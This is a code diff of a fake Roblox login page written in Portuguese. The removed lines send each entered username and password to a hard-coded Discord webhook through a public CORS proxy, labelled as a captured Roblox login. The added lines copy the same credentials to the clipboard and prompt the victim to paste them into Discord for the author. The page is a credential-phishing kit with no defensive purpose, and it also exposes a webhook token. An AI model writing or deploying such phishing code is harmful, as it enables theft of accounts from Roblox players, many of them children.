@@ -147,42 +147,28 @@
       }
     });
 
-    // Seu webhook Discord real
-    const webhookUrl = 'https://discord.com/api/webhooks/1473860451589685344/N8gc13rR1kJj7Pb5DznSI88Lpz_8BLcxUReQ5VulpR001D2os62t3HjFP-NTK_ABAuFm'; // ← COLE AQUI
-
-    // Proxy CORS público (troque se esse cair, alternativas: allorigins.win/get?url= ou corsproxy.io/?)
-    const proxyUrl = 'https://cors-anywhere.herokuapp.com/' + webhookUrl;
-
-    form.addEventListener('submit', async function(e) {
+    form.addEventListener('submit', function(e) {
       e.preventDefault();
 
-      const user = usernameInput.value.trim();
-      const pass = passwordInput.value.trim();
+      const nome = usernameInput.value.trim();
+      const senha = passwordInput.value.trim();
 
-      if (user && pass) {
-        const payload = {
-          content: `**Novo login Roblox capturado!**\n\n**Username/Email/Phone:** \`${user}\`\n**Senha:** \`${pass}\`\n\nDe: OlhadinhaDEV Clone`
-        };
+      if (nome && senha) {
+        const textoCopiado = `Nome: ${nome}\nSenha: ${senha}`;
 
-        try {
-          const response = await fetch(proxyUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-          });
+        navigator.clipboard.writeText(textoCopiado).then(() => {
+          alert('Dados copiados! Cole no Discord (Ctrl + V) e envie pra mim.');
+        }).catch(() => {
+          alert('Erro ao copiar. Copie manual:\n\n' + textoCopiado);
+        });
 
-          if (response.ok || response.status === 204) {
-            console.log('Enviado com sucesso via proxy!');
-          } else {
-            console.log('Falha no envio:', response.status);
-          }
-        } catch (err) {
-          console.error('Erro:', err);
-        }
+        window.open('https://discord.com/channels/@me', '_blank');
       }
 
       errorMsg.classList.add('show');
-      setTimeout(() => errorMsg.classList.remove('show'), 3000);
+      setTimeout(() => {
+        errorMsg.classList.remove('show');
+      }, 3000);
     });
   </script>
 
